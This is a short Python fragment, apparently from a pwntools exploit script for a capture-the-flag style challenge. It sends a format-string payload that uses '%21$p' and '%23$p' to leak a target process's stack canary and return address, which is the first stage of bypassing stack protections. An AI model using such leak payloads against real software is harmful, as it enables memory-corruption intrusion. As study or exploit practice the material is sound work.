p = b'LOAD .%21$p.%23$p'
print(len(p))
r.sendline(p)
data = r.recvline().decode()[:-1].split('.')
canary = int(data[1], 16)
retaddr = int(data[2], 16)

print(hex(canary), hex(retaddr))

